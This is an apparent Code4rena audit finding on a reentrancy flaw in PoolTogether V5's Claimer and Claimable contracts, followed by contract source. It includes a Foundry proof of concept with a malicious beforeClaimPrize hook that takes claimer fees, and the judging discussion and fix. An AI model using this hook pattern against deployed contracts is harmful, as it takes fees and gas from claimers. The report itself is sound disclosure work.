{
  "Title": "[M-01] The winner can steal claimer fees, and force him to pay for the gas",
  "Content": "\nWhen the winner earns his reward he can either claim it himself, or he can let a claimer contract withdraw it on his behalf, and he will pay part of his reward for that. This is because the user will not pay for the gas fees; instead the claimer contract will pay it instead.\n\nThe problem here is that the winner can make the claimer pay for the gas of the transaction, without paying the fees that the claimer contract takes.\n\nClaimer contracts are allowed for anyone to use them, transfer prizes to winners, and claim some fees; where the one who fired the transaction is the one who will pay for the fees, so he deserved those fees.\n\n[pt-v5-claimer/Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)\n\n```solidity\n  // @audit and one can call the function\n  function claimPrizes( ... ) external returns (uint256 totalFees) {\n    ...\n\n    if (!feeRecipientZeroAddress) {\n      ...\n    }\n\n    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);\n  }\n```\n\nAs in the function, the function takes the winners and he passed the fee recipient and his fees (but it should not exceed the `maxFees`, which is initialized in the constructor).\n\nNow we know that anyone can transfer winners' prizes and claim some fees.\n\nBefore the prizes are claimed, the winner can initialize a hook before calling the `PoolPrize::claimPrize`. This is used if the winner wants to initialize another address as the receiver of the reward. The hook parameter is passed by parameters that are used to determine the correct winner (winner address, tier, `prizeIndex`).\n\n[abstract/Claimable.sol#L85-L95](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L85-L95)\n\n```solidity\n    uint24 public constant HOOK_GAS = 150_000;\n\n    ...\n\n    function claimPrize( ... ) external onlyClaimer returns (uint256) {\n        address recipient;\n\n        if (_hooks[_winner].useBeforeClaimPrize) {\n            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }(\n                _winner,\n                _tier,\n                _prizeIndex,\n                _reward,\n                _rewardRecipient\n            );\n        } else {\n            recipient = _winner;\n        }\n\n        if (recipient == address(0)) revert ClaimRecipientZeroAddress();\n\n        uint256 prizeTotal = prizePool.claimPrize( ... );\n      \n        ...\n    }\n```\n\nBut to prevent `OOG` the gas is limited to `150K`.\n\nNow what the user can do to make the claimer pay for the transaction, and not pay any fees is:\n\n- He will make a `beforeClaimPrize` hook.\n- In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning prize parameters (we got them from the hook).\n- The winner (attacker) will not do any further interaction to not make the tx go `OOG` (remember we have only 150k).\n- After the user claims his reward, he will simply return his address (the winner's address).\n- The Claimer contract will go to claim this winner's rewards, but it will return 0 as it is already claimed.\n- The Claimer will complete his process (claiming other prizes on behalf of winners).\n- The winner (attacker) will end up claiming his reward without paying for the transaction gas fees.\n\nNote: The Claimer claiming function will not revert, as if the prize was already claimed the function will just emit an event and will not revert.\n\n[pt-v5-claimer/Claimer.sol#L194-L198](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L194-L198)\n\n```solidity\n  function _claim( ... ) internal returns (uint256) {\n    ...\n\n        try\n          _vault.claimPrize(_winners[w], _tier, _prizeIndices[w][p], _feePerClaim, _feeRecipient)\n        returns (uint256 prizeSize) {\n          if (0 != prizeSize) {\n            actualClaimCount++;\n          } else {\n            // @audit Emit an event if the prize already claimed\n            emit AlreadyClaimed(_winners[w], _tier, _prizeIndices[w][p]);\n          }\n        } catch (bytes memory reason) {\n          emit ClaimError(_vault, _tier, _winners[w], _prizeIndices[w][p], reason);\n        }\n\n    ...\n  }\n```\n\nThe only check that can prevent this attack is the gas cost of calling `beforeClaimPrize` hook.\n\nWe will call one function `Claimer::claimPrizes()` by only passing one winner, and without fees. We calculated the gas that can be used by installing protocol contracts (Claimer and PrizePool), then grab a test function that first the function we need, and we get these results:\n\n- Calling `Claimer::claimPrize()` costs `5292 gas` if it did not claimed anything.\n- Calling `PrizePool::claimePrize()` costs `118124 gas`.\n\nSo the total gas that can be used is `$118,124 + 5292 = $123,416` which is smaller than `HOOK_GAS` by more than `25K`, so the function will not revert because of OOG error, and the reentrancy will occur.\n\nAnother thing that may lead to a misunderstanding is that the Judger may say if this happens the function will go to `beforeClaimPrize` hook again leading to infinite loop and the transaction will go `OOG`. However, making the transaction `beforeClaimPrize` be fired to make a result and when called again do another logic is an easy task that can be made by implementing a counter or something. However, we did not implement this counter in our test. We just wanted to point out how the attack will work in our POC, but in real interactions, there should be some edge cases to take care of and further configurations to take care off.\n\n### Proof of Concept\n\nWe made a simulation of how the function will occur. We found that the testing environment made by the devs is abstracted a little bit compared to the real flow of transactions in the production mainnet, so I made Mock contracts, and simulated the attack with them. Please go for the testing script step by step, and it will work as intended.\n\n1. Add the following Imports and scripts in [`test/Claimable.t.sol::L8`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L8)\n\n<details>\n  <summary>Imports and Contracts</summary>\n\n```solidity\nimport { console2 } from \"forge-std/console2.sol\";\nimport { PrizePoolMock } from \"../contracts/mock/PrizePoolMock.sol\";\n\ncontract Auditor_MockPrizeToken {\n    mapping(address user => uint256 balance) public balanceOf;\n\n    function mint(address user, uint256 amount) public {\n        balanceOf[user] += amount;\n    }\n\n    function burn(address user, uint256 amount) public {\n        balanceOf[user] -= amount;\n    }\n}\n\ncontract Auditor_PrizePoolMock {\n    Auditor_MockPrizeToken public immutable prizeToken;\n\n    constructor(address _prizeToken) {\n        prizeToken = Auditor_MockPrizeToken(_prizeToken);\n    }\n\n    // The reward is fixed to 100 tokens\n    function claimPrize(\n        address winner,\n        uint8 /* _tier */,\n        uint32 /* _prizeIndex */,\n        address /* recipient */,\n        uint96 reward,\n        address rewardRecipient\n    ) public returns (uint256) {\n        // Distribute rewards if the PrizePool earns a reward\n        if (prizeToken.balanceOf(address(this)) >= 100e18) {\n            prizeToken.mint(winner, 100e18 - uint256(reward)); // Transfer reward tokens to the winner\n            // Transfer fees to the claimer Receipent.\n            // Instead of adding balance to the PrizePool contract and then the claimerRecipent\n            // Can withdraw it, we will transfer it to the claimerRecipent directly in our simulation\n            prizeToken.mint(rewardRecipient, reward);\n             // Simulating Token transfereing by minting and burning\n            prizeToken.burn(address(this), 100e18);\n        } else {\n            return 0;\n        }\n\n        return uint256(100e18);\n    }\n}\n\ncontract Auditor_Claimer {\n    ClaimableWrapper public immutable prizeVault;\n\n    constructor(address _prizeVault) {\n        prizeVault = ClaimableWrapper(_prizeVault);\n    }\n\n    function claimPrizes(\n        address[] calldata _winners,\n        uint8 _tier,\n        uint256 _claimerFees,\n        address _feeRecipient\n    ) external {\n        for (uint i = 0; i < _winners.length; i++) {\n            prizeVault.claimPrize(_winners[i], _tier, 0, uint96(_claimerFees), _feeRecipient);\n        }\n    }\n}\n```\n\n</details>\n<br>\n\n2. Add the following functions in [`test/Claimable.t.sol::L132`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L132)\n\n<details>\n\n  <summary>Testing Functions</summary>\n\n```solidity\n  Auditor_Claimer __claimer;\n\n  function testAuditor_winnerStealClaimerFees() public {\n      console2.log(\"Winner reward is 100 tokens\");\n      console2.log(\"Fees are 10% (10 tokens)\");\n      console2.log(\"=============\");\n      console2.log(\"Simulating the normal Operation (No stealing)\");\n      auditor_complete_claim_proccess(false);\n      console2.log(\"=============\");\n      console2.log(\"Simulating winner steal recipent fees\");\n      auditor_complete_claim_proccess(true);\n  }\n\n  function auditor_complete_claim_proccess(bool willSteal) internal {\n      // If tier is 1 we will take the claimer fees and if 0 we will do nothing\n      uint8 tier = willSteal ? 1 : 0;\n\n      Auditor_MockPrizeToken __prizeToken = new Auditor_MockPrizeToken();\n      Auditor_PrizePoolMock __prizePool = new Auditor_PrizePoolMock(address(__prizeToken));\n\n      address __winner = makeAddr(\"winner\");\n      address __claimerRecipent = makeAddr(\"claimerRecipent\");\n\n      // This will be like the `PrizeVault` that has the winner\n      ClaimableWrapper __claimable = new ClaimableWrapper(\n          PrizePool(address(__prizePool)),\n          address(1)\n      );\n\n      // Claimer contract, that can transfer winners rewards\n      __claimer = new Auditor_Claimer(address(__claimable));\n      // Set new Claimer\n      __claimable.setClaimer(address(__claimer));\n\n      VaultHooks memory beforeHookOnly = VaultHooks(true, false, hooks);\n\n      vm.startPrank(__winner);\n      __claimable.setHooks(beforeHookOnly);\n      vm.stopPrank();\n\n      // PrizePool earns 100 tokens from yields, and we picked the winner\n      __prizeToken.mint(address(__prizePool), 100e18);\n\n      address[] memory __winners = new address[](1);\n      __winners[0] = __winner;\n\n      // Claim Prizes by providing `__claimerRecipent`\n      __claimer.claimPrizes(__winners, tier, 10e18, __claimerRecipent);\n\n      console2.log(\"Winner PrizeTokens:\", __prizeToken.balanceOf(__winner) / 1e18, \"token\");\n      console2.log(\n          \"ClaimerRecipent PrizeTokens:\",\n          __prizeToken.balanceOf(__claimerRecipent) / 1e18,\n          \"token\"\n      );\n  }\n```\n\n</details>\n<br>\n\n3. Change [`beforeClaimPrize`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L254-L274) hook function, and replace it with the following:\n\n```solidity\n    function beforeClaimPrize(\n        address winner,\n        uint8 tier,\n        uint32 prizeIndex,\n        uint96 reward,\n        address rewardRecipient\n    ) external returns (address) {\n        address[] memory __winners = new address[](1);\n        __winners[0] = winner;\n\n        if (tier == 1) {\n            __claimer.claimPrizes(__winners, 0, 0, rewardRecipient);\n        }\n\n        return winner;\n    }\n```\n\n4. Check that everything is correct and run:\n\n```powershell\nforge test --mt testAuditor_winnerStealClaimerFees -vv\n```\n\n**Output**:\n\n```powershell\n  Winner reward is 100 tokens\n  Fees are 10% (10 tokens)\n  =============\n  Simulating the normal Operation (No stealing)\n  Winner PrizeTokens: 90 token\n  ClaimerRecipent PrizeTokens: 10 token\n  =============\n  Simulating winner steal recipient fees\n  Winner PrizeTokens: 100 token\n  ClaimerRecipent PrizeTokens: 0 token\n```\n\nIn this test, we first made a reward and withdrew it from our Claimer contract normally (no attack happened). Then, we made another prize reward but by making the attack when withdrawing it, which can be seen in the Logs.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nWe can check the prize state before and after the hook; if it changes from unclaimed to claimed, we can revert the transaction.\n\n**Claimable.sol:**\n\n```diff\n    function claimPrize( ... ) external onlyClaimer returns (uint256) {\n        address recipient;\n\n        if (_hooks[_winner].useBeforeClaimPrize) {\n+           bool isClaimedBefore = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);\n            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }( ... );\n+           bool isClaimedAfter = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);\n\n+           if (isClaimedBefore == false && isClaimedAfter == true) {\n+               revert(\"The Attack Occuared\");\n+           }\n        } else { ... }\n        ...\n    }\n\n```\n\n*Note: We were writing this issue 30 minutes before ending of the audit - the mitigation review may not be the best, or may not work (we did not test it). Devs should keep this in mind when mitigating this issue.*\n\n### Assessed type\n\nReentrancy\n\n**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-1992497462):**\n > `Claimable::claimPrize` has the visibility of `onlyClaimer` denying the winner's hook reentrancy. The winner can't any prize unless he/she is the permitted claimer.\n\n**[hansfriese (judge) decreased severity to Low](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-1999157985)**\n\n**[Al-Qa-qa (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2006932930):**\n > @hansfriese - There is a misunderstanding of this issue with its group (`78`), and I will illustrate how this occurs.\n> \n> There are three contracts that we will deal with for making this exploit:\n> - `PrizeVault(Claimable)`: this is the claimable contract that has the function to give a winner his prize.\n> - `Claimer`: The contract that has the authority to transfer the prize to the winner (from the Claimable contract).\n> - `PrizePool`: The Contract that has the prize, which we will be called to claim the prize and give it to the winner.\n> \n> The issue was rejected by replying that the `onlyClaimer` modifier prevents the hook from returning and calling the function again. So the judge thought that I said the `beforeClaimHook` will call `Claimable::claimPrize()`, and this is not what I said in my report.\n> \n> In my report, I said that the hook will go to the Claimer contract itself, and call the `claimPrizes` function (the function that is in Claimer contract that fires `PrizeVault(Claimable)::claimPrize`.\n> \n> `beforeClaimHook` will call `Claimer::claimPrizes()` which will call `Claimable::claimPrize()`\n> \n> > - He will make a `beforeClaimPrize` hook.\n> > - In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning prize parameters (we got them from the hook).\n> \n> I think the conflict occurs as `Claimer` and `Claimable` are two different contracts, but they have similar names as well as the function names are also similar `claimPrize` and `claimPrizes`.\n> \n> I illustrated in my report that the way the Claimer contract design is not restricted and, anyone can use it to claim fees and send prizes to the winners.\n> \n> > [Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)\n> > ```solidity\n> >   // @audit and one can call the function\n> >  function claimPrizes( ... ) external returns (uint256 totalFees) {\n> >   ...\n> >\n> >   if (!feeRecipientZeroAddress) {\n> >      ...\n> >   }\n> >\n> >    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);\n> >  }\n> > ```\n> \n> According to @raymondfam's comment for rejecting this issue:\n> \n> > Claimable::claimPrize has the visibility of onlyClaimer denying the winner's hook reentrancy. The winner can't any prize unless he/she is the permitted claimer.\n> \n> Anyone can be a permitted claimer as the function that interacts with the `PrizeVault(Claimable)` is accessible to anyone, as I showed here and in my report.\n> \n> In my report I did not say that the hook will go to fire `PrizeVault(Claimable)::claimPrize` directly, Instead, I said that it will call `Claimer::claimPrizes()`.\n>\n> So the pass will be the following:\n> \n> We will use (MEV searcher) to represent the one that claims winners' prizes using Claimer contract.\n> \n> 1. MEV searcher call `Claimer::claimPrizes(...params)`, providing more than one winner.\n> 2. When the malicious winner prize is the next one on the queue, `beforeClaimPrize` will be used to call `Claimer::claimPrizes()` again, using the parameters passed to it, and the winner prize will get claimed using MEV searcher gas, but without paying the fees to the MEV searcher.\n> 3. Since the Prize already claimed, the MEV searcher will not be able to reclaim it again, and will gain 0 fees (Knowing that he is the one who paid for the gas in the first place).\n> \n> **PASS:**\n> 1. `MEV--Claimer::claimPrizes(...)`.\n> 2. `PrizeVault(Claimabe)::claimPrize()`.\n> 3. `PrizeVault(Claimabe):WinnerHook:beforeClaimPrize()`.\n> 4. `WinnerHook--Claimer::claimPrizes()` (with winner (attacker) params, no fees).\n> 5. `PrizeVault(Claimabe)::claimPrize()`  (with winner (attacker) params, no fees).\n> 6. `PrizeVault(Claimabe):WinnerHook:beforeClaimPrize()` (with winner (attacker) params, no fees).<br>\n>       - 6.1 Make `beforeClaimPrize` just return winner address at this time.\n> 7. `PrizeVault(Claimabe):PrizePool::claimPrize([using no fees])` (with winner (attacker) params, no fees).<br>\n>       - 7.1 After the winner (attacker) claimed his reward using `beforeClaimPrize()`, the function `beforeClaimPrize()` will return the winner address.<br>\n>       - 7.2 `beforeClaimPrize` returned the winner address (note: `4`, `5`, `6` and `7` happens inside `beforeClaimPrize()` when the MEV searcher called claimer at `1`.\n>       - 7.3 After this, the function will complete its execution (and the MEV will go to claim the prize of the winner and earn fees).\n> 8. `PrizePool::claimPrize([using fees])` (with MEV searcher params, with fees).\n> 9. Function return 0 as it is already claimed.\n> \n> I highly encourage setting up the PoC and running it, I made a simulation of the normal state, and when the hook is used to steal rewards. By providing `-vvvv`, the call path will be viewed clearly.\n> \n> All what I said here exists in my report, and I provided a runnable PoC that can be used by the judge to simulate the attack, it can be viewed by expanding the collapsed content from the triangle, and following setting up PoC instructions.\n> \n> One additional thing: this issue is not a duplicate of issue `18`, my issue illustrates how the winner can steal the fees, and force the MEV searcher to pay for the gas.\n> \n> As I illustrated in the title there are two Impacts:\n> - The fees will get stolen from the caller of `Claimer contract` (MEV searcher), and the winner will get them himself.\n> - The Winner will force the caller (MEV searcher) to pay for the gas, which can be considered griefing.\n\n**[hansfriese (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2008963116):**\n > Nice report! After checking again, I agree it's a valid concern and Medium is appropriate.\n\n**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2013975691):**\n > Although this issue can be mitigated in the `PrizeVault` as described, we chose to update the `PrizePool` and `Claimer` contracts with logic that ensures a double prize claim will revert so that the griefer will not receive their prize. This removes any incentivization for the malicious hook to be set. (PRs linked for context)\n> \n> By fixing the issue in the prize pool and claimer, we save gas by avoiding the two additional external calls added in the original mitigation.\n> \n> `PrizePool.sol` mitigation [here](https://github.com/GenerationSoftware/pt-v5-prize-pool/pull/100) and `Claimer.sol` mitigation [here](https://github.com/GenerationSoftware/pt-v5-claimer/pull/28).\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-03-pooltogether",
  "Code": [
    {
      "filename": "src/Claimer.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { SD59x18 } from \"prb-math/SD59x18.sol\";\nimport { UD2x18 } from \"prb-math/UD2x18.sol\";\nimport { UD60x18, convert } from \"prb-math/UD60x18.sol\";\nimport { PrizePool } from \"pt-v5-prize-pool/PrizePool.sol\";\nimport { SafeCast } from \"openzeppelin/utils/math/SafeCast.sol\";\n\nimport { LinearVRGDALib } from \"./libraries/LinearVRGDALib.sol\";\nimport { IClaimable } from \"pt-v5-claimable-interface/interfaces/IClaimable.sol\";\n\n/// @notice Thrown when the length of the winners array does not match the length of the prize indices array while claiming.\n/// @param winnersLength Length of the winners array\n/// @param prizeIndicesLength Length of the prize indices array\nerror ClaimArraySizeMismatch(uint256 winnersLength, uint256 prizeIndicesLength);\n\n/// @notice Thrown when the VRGDA fee is below the minimum fee\n/// @param minFee The minimum fee requested by the user\n/// @param fee The actual VRGDA fee\nerror VrgdaClaimFeeBelowMin(uint256 minFee, uint256 fee);\n\n/// @notice Thrown when the prize pool is set the the zero address\nerror PrizePoolZeroAddress();\n\n/// @notice Thrown when someone tries to claim a prizes with a fee, but sets the fee recipient address to the zero address.\nerror FeeRecipientZeroAddress();\n\n/// @notice Thrown when the time to reach the max fee is zero\nerror TimeToReachMaxFeeZero();\n\n/// @title Variable Rate Gradual Dutch Auction (VRGDA) Claimer\n/// @author G9 Software Inc.\n/// @notice This contract uses a variable rate gradual dutch auction to incentivize prize claims on behalf of others.  Fees for each canary tier is set to the respective tier's prize size.\ncontract Claimer {\n\n  /// @notice Emitted when a claim reverts\n  /// @param vault The vault for which the claim failed\n  /// @param tier The tier for which the claim failed\n  /// @param winner The winner for which the claim failed\n  /// @param prizeIndex The prize index for which the claim failed\n  /// @param reason The revert reason\n  event ClaimError(\n    IClaimable indexed vault,\n    uint8 indexed tier,\n    address indexed winner,\n    uint32 prizeIndex,\n    bytes reason\n  );\n\n  /// @notice The Prize Pool that this Claimer is claiming prizes for\n  PrizePool public immutable prizePool;\n\n  /// @notice The maximum fee that can be charged as a portion of the prize size. Fixed point 18 number\n  UD2x18 public immutable maxFeePortionOfPrize;\n\n  /// @notice The time in seconds to reach the max auction fee\n  uint256 public immutable timeToReachMaxFee;\n\n  /// @notice Constructs a new Claimer\n  /// @param _prizePool The prize pool to claim for\n  /// @param _timeToReachMaxFee The time it should take to reach the maximum fee\n  /// @param _maxFeePortionOfPrize The maximum fee that can be charged as a portion of the prize size. Fixed point 18 number\n  constructor(\n    PrizePool _prizePool,\n    uint256 _timeToReachMaxFee,\n    UD2x18 _maxFeePortionOfPrize\n  ) {\n    if (address(0) == address(_prizePool)) {\n      revert PrizePoolZeroAddress();\n    }\n    if (_timeToReachMaxFee == 0) {\n      revert TimeToReachMaxFeeZero();\n    }\n    prizePool = _prizePool;\n    maxFeePortionOfPrize = _maxFeePortionOfPrize;\n    timeToReachMaxFee = _timeToReachMaxFee;\n  }\n\n  /// @notice Allows the caller to claim prizes on behalf of others or for themself.\n  /// @dev If you are claiming for yourself or don't want to take a fee, set the `_feeRecipient` and\n  /// `_minFeePerClaim` to zero. This will save some gas on fee calculation.\n  /// @param _vault The vault to claim from\n  /// @param _tier The tier to claim for\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @param _feeRecipient The address to receive the claim fees\n  /// @param _minFeePerClaim The minimum fee for each claim\n  /// @return totalFees The total fees collected across all successful claims\n  function claimPrizes(\n    IClaimable _vault,\n    uint8 _tier,\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices,\n    address _feeRecipient,\n    uint256 _minFeePerClaim\n  ) external returns (uint256 totalFees) {\n    bool feeRecipientZeroAddress = address(0) == _feeRecipient;\n    if (feeRecipientZeroAddress && _minFeePerClaim != 0) {\n      revert FeeRecipientZeroAddress();\n    }\n    if (_winners.length != _prizeIndices.length) {\n      revert ClaimArraySizeMismatch(_winners.length, _prizeIndices.length);\n    }\n\n    uint96 feePerClaim;\n\n    /**\n     * If the claimer hasn't specified both a min fee and a fee recipient, we assume that they don't\n     * expect a fee and save them some gas on the calculation.\n     */\n    if (!feeRecipientZeroAddress) {\n      feePerClaim = SafeCast.toUint96(_computeFeePerClaim(_tier, _countClaims(_winners, _prizeIndices), prizePool.claimCount()));\n      if (feePerClaim < _minFeePerClaim) {\n        revert VrgdaClaimFeeBelowMin(_minFeePerClaim, feePerClaim);\n      }\n    }\n\n    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);\n  }\n\n  /// @notice Computes the number of claims that will be made\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @return The number of claims\n  function _countClaims(\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices\n  ) internal pure returns (uint256) {\n    uint256 claimCount;\n    uint256 length = _winners.length;\n    for (uint256 i = 0; i < length; i++) {\n      claimCount += _prizeIndices[i].length;\n    }\n    return claimCount;\n  }\n\n  /// @notice Claims prizes for a batch of winners and prize indices\n  /// @param _vault The vault to claim from\n  /// @param _tier The tier to claim for\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @param _feeRecipient The address to receive the claim fees\n  /// @param _feePerClaim The fee to charge for each claim\n  /// @return The number of claims that were successful\n  function _claim(\n    IClaimable _vault,\n    uint8 _tier,\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices,\n    address _feeRecipient,\n    uint96 _feePerClaim\n  ) internal returns (uint256) {\n    uint256 actualClaimCount;\n    uint256 prizeIndicesLength;\n\n    // `_winners.length` is not cached cause via-ir would need to be used\n    for (uint256 w = 0; w < _winners.length; w++) {\n      prizeIndicesLength = _prizeIndices[w].length;\n      for (uint256 p = 0; p < prizeIndicesLength; p++) {\n        try\n          _vault.claimPrize(_winners[w], _tier, _prizeIndices[w][p], _feePerClaim, _feeRecipient)\n        returns (uint256 /* prizeSize */) {\n          actualClaimCount++;\n        } catch (bytes memory reason) {\n          emit ClaimError(_vault, _tier, _winners[w], _prizeIndices[w][p], reason);\n        }\n      }\n    }\n\n    return actualClaimCount;\n  }\n\n  /// @notice Computes the total fees for the given number of claims.\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @return The total fees for those claims\n  function computeTotalFees(uint8 _tier, uint256 _claimCount) external view returns (uint256) {\n    return computeTotalFees(_tier, _claimCount, prizePool.claimCount());\n  }\n\n  /// @notice Computes the total fees for the given number of claims if a number of claims have already been made.\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @param _claimedCount The number of prizes already claimed\n  /// @return The total fees for those claims\n  function computeTotalFees(\n    uint8 _tier,\n    uint256 _claimCount,\n    uint256 _claimedCount\n  ) public view returns (uint256) {\n    return _computeFeePerClaim(_tier, _claimCount, _claimedCount) * _claimCount;\n  }\n\n  /// @notice Computes the fee per claim for the given tier and number of claims\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @return The fee that will be taken per claim\n  function computeFeePerClaim(uint8 _tier, uint256 _claimCount) external view returns (uint256) {\n    return _computeFeePerClaim(_tier, _claimCount, prizePool.claimCount());\n  }\n\n  /// @notice Computes the total fees for the given number of claims.\n  /// @param _tier The tier\n  /// @param _claimCount The number of claims to check\n  /// @param _claimedCount The number of prizes already claimed\n  /// @return The total fees for the claims\n  function _computeFeePerClaim(\n    uint8 _tier,\n    uint256 _claimCount,\n    uint256 _claimedCount\n  ) internal view returns (uint256) {\n    if (_claimCount == 0) {\n      return 0;\n    }\n    if (prizePool.isCanaryTier(_tier)) {\n      return prizePool.getTierPrizeSize(_tier);\n    }\n    uint8 numberOfTiers = prizePool.numberOfTiers();\n    uint256 targetFee = _computeFeeTarget(numberOfTiers);\n    SD59x18 decayConstant = _computeDecayConstant(targetFee, numberOfTiers);\n    uint256 _maxFee = _computeMaxFee(_tier);\n    SD59x18 perTimeUnit = LinearVRGDALib.getPerTimeUnit(\n      prizePool.estimatedPrizeCountWithBothCanaries(),\n      timeToReachMaxFee\n    );\n    uint256 elapsed = block.timestamp - (prizePool.lastAwardedDrawAwardedAt());\n    uint256 fee;\n\n    for (uint256 i = 0; i < _claimCount; i++) {\n      fee += _computeFeeForNextClaim(\n        targetFee,\n        decayConstant,\n        perTimeUnit,\n        elapsed,\n        _claimedCount + i,\n        _maxFee\n      );\n    }\n\n    return fee / _claimCount;\n  }\n\n  /// @notice Computes the maximum fee that can be charged.\n  /// @param _tier The tier to compute the max fee for\n  /// @return The maximum fee that can be charged\n  function computeMaxFee(uint8 _tier) public view returns (uint256) {\n    if (prizePool.isCanaryTier(_tier)) {\n      return type(uint256).max; // no limit\n    } else {\n      return _computeMaxFee(_tier);\n    }\n  }\n\n  /// @notice Compute the target fee for prize claims\n  /// @param _numberOfTiers The current number of tiers for the prize pool\n  /// @return The target fee for prize claims\n  function _computeFeeTarget(uint8 _numberOfTiers) internal view returns (uint256) {\n    // we expect the fee to be somewhere between the first and second canary tier prize sizes,\n    // so we set it to the lower of the two.\n    return prizePool.getTierPrizeSize(_numberOfTiers - 1);\n  }\n\n  /// @notice Computes the decay constant for the VRGDA.\n  /// @dev This is a decay constant that ensures the fee will grow from the target to the max fee within the time frame\n  /// @param _targetFee The target fee\n  /// @param _numberOfTiers The current number of tiers for the prize pool\n  /// @return The decay constant\n  function _computeDecayConstant(uint256 _targetFee, uint8 _numberOfTiers) internal view returns (SD59x18) {\n    // the max fee should never need to go beyond the full daily prize size under normal operating\n    // conditions.\n    uint maximumFee = prizePool.getTierPrizeSize(_numberOfTiers - 3);\n    return LinearVRGDALib.getDecayConstant(\n      LinearVRGDALib.getMaximumPriceDeltaScale(\n        _targetFee,\n        maximumFee,\n        timeToReachMaxFee\n      )\n    );\n  }\n\n  /// @notice Computes the max fee given the tier\n  /// @param _tier The tier to compute the max fee for\n  /// @return The maximum fee that will be charged for a prize claim for the given tier\n  function _computeMaxFee(uint8 _tier) internal view returns (uint256) {\n    uint256 prizeSize = prizePool.getTierPrizeSize(_tier);\n    return\n      convert(\n        maxFeePortionOfPrize.intoUD60x18().mul(convert(prizeSize))\n      );\n  }\n\n  /// @notice Computes the fee for the next claim.\n  /// @param _targetFee The target fee that should be charged\n  /// @param _decayConstant The VRGDA decay constant\n  /// @param _perTimeUnit The num to be claimed per second\n  /// @param _elapsed The number of seconds that have elapsed\n  /// @param _sold The number of prizes that were claimed\n  /// @param _maxFee The maximum fee that can be charged\n  /// @return The fee to charge for the next claim\n  function _computeFeeForNextClaim(\n    uint256 _targetFee,\n    SD59x18 _decayConstant,\n    SD59x18 _perTimeUnit,\n    uint256 _elapsed,\n    uint256 _sold,\n    uint256 _maxFee\n  ) internal pure returns (uint256) {\n    uint256 fee = LinearVRGDALib.getVRGDAPrice(\n      _targetFee,\n      _elapsed,\n      _sold,\n      _perTimeUnit,\n      _decayConstant\n    );\n    return fee > _maxFee ? _maxFee : fee;\n  }\n}"
    },
    {
      "filename": "pt-v5-vault/src/abstract/Claimable.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { IClaimable } from \"pt-v5-claimable-interface/interfaces/IClaimable.sol\";\nimport { PrizePool } from \"pt-v5-prize-pool/PrizePool.sol\";\n\nimport { HookManager } from \"./HookManager.sol\";\n\n/// @title  PoolTogether V5 Claimable Vault Extension\n/// @author G9 Software Inc.\n/// @notice Provides an interface for Claimer contracts to interact with a vault in PoolTogether\n/// V5 while allowing each account to set and manage prize hooks that are called when they win.\nabstract contract Claimable is HookManager, IClaimable {\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // Public Constants and Variables\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @notice The gas to give to each of the before and after prize claim hooks.\n    /// @dev This should be enough gas to mint an NFT if needed.\n    uint24 public constant HOOK_GAS = 150_000;\n\n    /// @notice Address of the PrizePool that computes prizes.\n    PrizePool public immutable prizePool;\n\n    /// @notice Address of the claimer.\n    address public claimer;\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // Errors\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @notice Thrown when the Prize Pool is set to the zero address.\n    error PrizePoolZeroAddress();\n\n    /// @notice Thrown when the Claimer is set to the zero address.\n    error ClaimerZeroAddress();\n\n    /// @notice Thrown when a prize is claimed for the zero address.\n    error ClaimRecipientZeroAddress();\n\n    /// @notice Thrown when the caller is not the prize claimer.\n    /// @param caller The caller address\n    /// @param claimer The claimer address\n    error CallerNotClaimer(address caller, address claimer);\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // 